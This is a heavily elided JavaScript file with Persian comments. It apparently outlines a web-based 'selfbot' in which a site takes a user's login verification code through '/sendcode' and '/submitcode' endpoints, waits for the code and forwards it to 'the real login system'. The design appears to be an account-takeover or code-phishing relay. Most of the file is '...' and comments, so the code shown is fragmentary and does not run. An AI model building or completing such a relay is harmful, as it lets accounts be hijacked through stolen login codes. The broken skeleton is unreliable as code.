...
// ============================================
// 📁 index.js - سلف‌بات با ارسال کد به اکانت شخصی
// ============================================

// ============================================
// 📱 ارسال کد با سلف‌بات (به اکانت شخصی)
// ============================================
...
async function sendCodeViaSelfBot(code, phone, env) {
  try {
    ...
    // ارسال کد به خودمون (Saved Messages)
...
async function waitForCodeFromUser(env) {
  // منتظر می‌مونه تا کاربر کد رو در وب‌سایت وارد کنه
  for (let i = 0; i < 120; i++) {
  ...
  <script>
    ...
    if (url.pathname === '/sendcode' && request.method === 'POST') {
      try {
        ...
        // ============================================
        // 🚀 ارسال کد با سلف‌بات (اکانت شخصی)
        // ============================================
        ...
        try {
          ...
          // اگر سشن نداریم، از شماره استفاده می‌کنیم
...
🌸 با عشق سارا
    ...
    if (url.pathname === '/submitcode') {
      try {
        ...
        // انتقال کد به سیستم لاگین واقعی
